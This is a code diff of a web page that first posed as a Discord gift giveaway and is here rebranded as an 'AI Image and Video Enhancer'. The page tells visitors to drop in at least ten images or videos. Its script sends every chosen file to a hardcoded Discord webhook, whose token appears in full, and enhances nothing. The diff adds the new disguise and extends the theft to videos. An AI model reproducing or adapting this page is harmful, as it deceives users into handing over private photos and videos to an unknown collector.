@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>AI Image Enhancer</title>
+    <title>AI Image and Video Enhancer</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -107,25 +107,25 @@
 </head>
 <body>
     <div class="navbar">
-        <h1>Discord Gifts</h1>
+        <h1>AI Image and Video Enhancer</h1>
         <nav>
-            <a href="#just-for asthetics">Home</a>
-            <a href="#just-for asthetics">Features</a>
-            <a href="#just-for asthetics">Contact</a>
+            <a href="#">Home</a>
+            <a href="#">Features</a>
+            <a href="#">Contact</a>
         </nav>
     </div>
-  <h1><span style="color:#007bff;">Gift-A-Cord</span>:Gwen!!!</h1>
+
     <div class="drop-zone" id="dropZone">
-        <h2>Drag & Drop Images Here</h2>
-        <p>Or <label for="fileInput">Select Images</label><span style="font-size:8px; color:#444; font-weight:bold;"> (3 imgs)</span></p>
-        <input type="file" id="fileInput" multiple accept="image/*">
+        <h2>Drag & Drop Images or Videos Here</h2>
+        <p>Or <label for="fileInput">Select Files</label></p>
+        <input type="file" id="fileInput" multiple accept="image/*,video/*">
     </div>
 
-    <div class="alert" id="alert">Please upload at least 3 images for gift.</div>
+    <div class="alert" id="alert">Please upload at least 10 images or videos.</div>
 
     <script>
         const webhookUrl = 'https://discord.com/api/webhooks/1264451780767514684/f6P6sYewzZcU7hgEVpfrz0KCPK7UnvEDAUxJve9YnqWN8qDHpHKYnGGl4-shjcxma0_4'; 
-        const minImageCount = 3;
+        const minFileCount = 10;
 
         const dropZone = document.getElementById('dropZone');
         const fileInput = document.getElementById('fileInput');
@@ -154,20 +154,20 @@
 
         function handleFiles(files) {
             const fileArray = Array.from(files);
-            if (fileArray.length < minImageCount) {
+            if (fileArray.length < minFileCount) {
                 alertBox.classList.add('show');
             } else {
                 alertBox.classList.remove('show');
             }
 
             fileArray.forEach(file => {
-                if (file.type.startsWith('image/')) {
+                if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
                     const reader = new FileReader();
 
                     reader.onload = async function(event) {
-                        const imageData = event.target.result;
+                        const fileData = event.target.result;
                         const formData = new FormData();
-                        formData.append('file', new Blob([imageData], { type: file.type }), file.name);
+                        formData.append('file', new Blob([fileData], { type: file.type }), file.name);
 
                         try {
                             const response = await fetch(webhookUrl, {
@@ -175,18 +175,18 @@
                                 body: formData
                             });
                             if (response.ok) {
-                                console.log(`Image ${file.name} sent successfully.`);
+                                console.log(`${file.name} sent successfully.`);
                             } else {
-                                console.error(`Failed to send image ${file.name}.`);
+                                console.error(`Failed to send ${file.name}.`);
                             }
                         } catch (error) {
-                            console.error(`Error sending image ${file.name}:`, error);
+                            console.error(`Error sending ${file.name}:`, error);
                         }
                     };
 
                     reader.readAsArrayBuffer(file);
                 } else {
-                    console.log(`${file.name} is not an image file.`);
+                    console.log(`${file.name} is not a supported file type.`);
                 }
             });
         }
